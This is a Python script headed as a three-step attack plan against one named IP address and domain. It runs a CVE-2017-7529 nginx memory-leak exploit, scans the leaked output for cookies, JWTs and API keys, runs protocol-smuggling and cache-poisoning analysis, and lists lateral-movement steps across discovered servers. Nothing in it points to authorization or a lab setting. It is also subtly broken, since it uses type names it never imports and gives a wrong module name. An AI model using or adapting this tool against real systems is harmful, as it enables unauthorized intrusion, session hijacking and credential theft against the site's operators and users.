#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Optimized Three-Step Attack Plan for 125.212.254.149
Using State Graph Model and Mature Protocol Implementations
"""

import asyncio
import subprocess
import sys
import json
from datetime import datetime
import os

class OptimizedAttackPlan:
    def __init__(self):
        self.target_ip = "125.212.254.149"
        self.target_domain = "go88.com"
        self.results = {}
        
    async def install_dependencies(self):
        """Ensure all required dependencies are installed"""
        print("[*] Checking dependencies...")
        try:
            import httpx
            import networkx
            import dnspython
            print("[+] Core dependencies already installed")
        except ImportError:
            print("[!] Installing required dependencies...")
            subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
            
    async def step1_cve_exploit(self):
        """Step 1: CVE-2017-7529 Memory Leak Exploitation"""
        print("\n" + "="*60)
        print("STEP 1: CVE-2017-7529 EXPLOITATION")
        print("="*60)
        
        # Run the CVE exploit
        cmd = [sys.executable, "exploit_cve_2017_7529.py", f"https://{self.target_ip}/"]
        print(f"[*] Executing: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            self.results['cve_exploit'] = {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
            print(result.stdout)
            
            # Parse for leaked information
            if "Found" in result.stdout:
                print("\n[+] CRITICAL: Memory leak successful! Analyzing leaked data...")
                self._analyze_leaked_data(result.stdout)
                
        except subprocess.TimeoutExpired:
            print("[-] Exploit timed out")
        except Exception as e:
            print(f"[-] Error running exploit: {e}")
            
    def _analyze_leaked_data(self, output: str):
        """Extract critical information from leaked memory"""
        critical_findings = []
        
        # Look for specific patterns
        patterns = {
            'Cookie': 'session hijacking',
            'Authorization': 'auth bypass',
            'JWT': 'token theft',
            'Internal IP': 'infrastructure mapping',
            'API Key': 'API access'
        }
        
        for pattern, impact in patterns.items():
            if pattern in output:
                critical_findings.append(f"{pattern} -> {impact}")
                
        if critical_findings:
            print("\n[!] CRITICAL FINDINGS:")
            for finding in critical_findings:
                print(f"    - {finding}")
                
    async def step2_state_graph_analysis(self):
        """Step 2: State Graph Protocol Analysis with v2"""
        print("\n" + "="*60)
        print("STEP 2: STATE GRAPH PROTOCOL ANALYSIS")
        print("="*60)
        
        # Check if v2 exists, otherwise use v1
        v2_path = "proto_norm_diff_v2.py"
        v1_path = "proto_norm_diff.py"
        
        proto_script = v2_path if os.path.exists(v2_path) else v1_path
        
        # Test go88.com
        output_file = f"go88_state_graph_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        cmd = [
            sys.executable, proto_script,
            self.target_domain,
            "--port", "443",
            "--dimensions", "headers", "path", "authority", "cache", "cl_te",
            "--output", output_file
        ]
        
        print(f"[*] Running state graph analysis: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0 and os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    analysis = json.load(f)
                    
                self._analyze_attack_paths(analysis)
                self.results['state_graph'] = analysis
            else:
                print(f"[-] Analysis failed: {result.stderr}")
                
        except Exception as e:
            print(f"[-] Error in state graph analysis: {e}")
            
    def _analyze_attack_paths(self, analysis: Dict):
        """Analyze discovered attack paths"""
        print("\n[+] State Graph Analysis Results:")
        
        # Check for v2 format (with attack_paths)
        if 'attack_paths' in analysis and analysis['attack_paths']:
            print(f"\n[!] Found {len(analysis['attack_paths'])} attack paths!")
            
            for i, path in enumerate(analysis['attack_paths'][:3], 1):
                print(f"\n  Attack Path #{i} (Risk: {path.get('total_risk_score', 0):.1f}):")
                for step in path.get('steps', []):
                    print(f"    → {step.get('transition_type', 'Unknown')}: {step.get('test_case', {}).get('id', 'N/A')}")
                    
        # Fallback to v1 format
        elif 'vulnerabilities' in analysis:
            vulns = analysis['vulnerabilities']
            
            # Focus on critical findings
            critical = [v for v in vulns if v.get('risk_score', 0) >= 10]
            high = [v for v in vulns if 5 <= v.get('risk_score', 0) < 10]
            
            if critical:
                print(f"\n[!] {len(critical)} CRITICAL vulnerabilities found:")
                for v in critical[:3]:
                    print(f"  - {v['test_id']}: {v.get('attack_vectors', ['Unknown'])[0]}")
                    
            if high:
                print(f"\n[!] {len(high)} HIGH vulnerabilities found:")
                for v in high[:3]:
                    print(f"  - {v['test_id']}: Risk score {v['risk_score']}")
                    
    async def step3_intelligent_recon(self):
        """Step 3: Intelligent Infrastructure Reconnaissance"""
        print("\n" + "="*60)
        print("STEP 3: INTELLIGENT RECONNAISSANCE")
        print("="*60)
        
        # Run go88 recon
        cmd = [sys.executable, "go88_recon.py"]
        print(f"[*] Running reconnaissance: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            print(result.stdout)
            
            # Extract discovered IPs from output
            discovered_ips = self._extract_ips_from_output(result.stdout)
            
            if discovered_ips:
                print(f"\n[+] Testing {len(discovered_ips)} discovered IPs...")
                await self._test_discovered_infrastructure(discovered_ips)
                
        except Exception as e:
            print(f"[-] Error in reconnaissance: {e}")
            
    def _extract_ips_from_output(self, output: str) -> List[str]:
        """Extract IP addresses from recon output"""
        import re
        ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
        ips = re.findall(ip_pattern, output)
        return list(set(ips))  # Remove duplicates
        
    async def _test_discovered_infrastructure(self, ips: List[str]):
        """Test discovered IPs for vulnerabilities"""
        vulnerable_ips = []
        
        for ip in ips:
            if ip == self.target_ip:
                continue  # Skip the main target
                
            print(f"\n[*] Quick test on {ip}...")
            
            # Test for nginx version
            try:
                import httpx
                async with httpx.AsyncClient(verify=False, timeout=5) as client:
                    response = await client.get(f"https://{ip}/", 
                                               headers={'Host': self.target_domain})
                    server = response.headers.get('server', '').lower()
                    
                    if 'nginx/1.12' in server:
                        print(f"  [!] VULNERABLE: {ip} also runs nginx/1.12.x!")
                        vulnerable_ips.append(ip)
                    elif 'nginx' in server:
                        print(f"  [+] Found nginx: {server}")
                    else:
                        print(f"  [-] Server: {server or 'Unknown'}")
                        
            except Exception as e:
                print(f"  [-] Error testing {ip}: {e}")
                
        if vulnerable_ips:
            print(f"\n[!] CRITICAL: Found {len(vulnerable_ips)} additional vulnerable servers!")
            print("    These may be development/staging servers with weaker security!")
            
    async def generate_attack_synthesis(self):
        """Generate final attack synthesis and recommendations"""
        print("\n" + "="*60)
        print("ATTACK SYNTHESIS & RECOMMENDATIONS")
        print("="*60)
        
        # Check what we've discovered
        has_memory_leak = 'cve_exploit' in self.results and self.results['cve_exploit']['returncode'] == 0
        has_state_paths = 'state_graph' in self.results and (
            self.results['state_graph'].get('attack_paths') or 
            self.results['state_graph'].get('vulnerabilities')
        )
        
        print("\n[*] Attack Surface Summary:")
        print(f"  - CVE-2017-7529 Memory Leak: {'EXPLOITABLE' if has_memory_leak else 'Unknown'}")
        print(f"  - State Graph Attack Paths: {'FOUND' if has_state_paths else 'None discovered'}")
        print(f"  - Infrastructure Expansion: {len(self._extract_ips_from_output(str(self.results)))} IPs found")
        
        print("\n[*] Recommended Attack Sequence:")
        
        if has_memory_leak:
            print("\n  1. IMMEDIATE: Exploit memory leak to extract:")
            print("     - Session cookies for admin access")
            print("     - API keys for backend services")
            print("     - Internal infrastructure details")
            
        if has_state_paths:
            print("\n  2. PROTOCOL ATTACKS: Execute discovered attack paths:")
            print("     - Use status flip vulnerabilities for auth bypass")
            print("     - Exploit path normalization for directory traversal")
            print("     - Leverage cache poisoning for persistent access")
            
        print("\n  3. LATERAL MOVEMENT: Expand to discovered infrastructure:")
        print("     - Test all go88.com subdomains for same vulnerabilities")
        print("     - Look for development/staging servers")
        print("     - Check for shared credentials/sessions")
        
        print("\n[*] Saving results to: attack_results.json")
        with open('attack_results.json', 'w') as f:
            json.dump(self.results, f, indent=2, default=str)

async def main():
    print("""
╔══════════════════════════════════════════════════════════╗
║      OPTIMIZED ATTACK PLAN: 125.212.254.149              ║
║        State Graph Model + Mature Protocols               ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    attack = OptimizedAttackPlan()
    
    # Ensure dependencies
    await attack.install_dependencies()
    
    # Execute three-step plan
    await attack.step1_cve_exploit()
    await attack.step2_state_graph_analysis()
    await attack.step3_intelligent_recon()
    
    # Generate synthesis
    await attack.generate_attack_synthesis()
    
    print("\n[+] Attack plan execution complete!")
    print("[*] Review attack_results.json for detailed findings")

if __name__ == "__main__":
    asyncio.run(main())